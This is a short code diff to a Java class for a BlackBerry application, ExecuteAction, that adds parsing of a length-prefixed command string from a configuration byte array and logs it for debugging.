@@ -7,7 +7,12 @@
  * *************************************************/
 package blackberry.action;
 
+import java.io.EOFException;
+
+import net.rim.device.api.util.DataBuffer;
 import blackberry.event.Event;
+import blackberry.utils.Check;
+import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -15,6 +20,7 @@ import blackberry.event.Event;
  */
 public final class ExecuteAction extends SubAction {
 
+    private String command;
     /**
      * Instantiates a new execute action.
      * 
@@ -49,7 +55,22 @@ public final class ExecuteAction extends SubAction {
      * @see blackberry.action.SubAction#parse(byte[])
      */
     protected boolean parse(final byte[] confParams) {
+        // estrarre la stringa.
+        final DataBuffer databuffer = new DataBuffer(confParams, 0,
+                confParams.length, false);
+        try {
+            int len = databuffer.readInt();
+            byte[] buffer = new byte[len];
+            databuffer.read(buffer);
+            command = WChar.getString(buffer, true);           
 
+        } catch (final EOFException e) {
+
+            return false;
+        }
+        
+        //#debug info
+        debug.info("command: " + command);
         return true;
     }
 
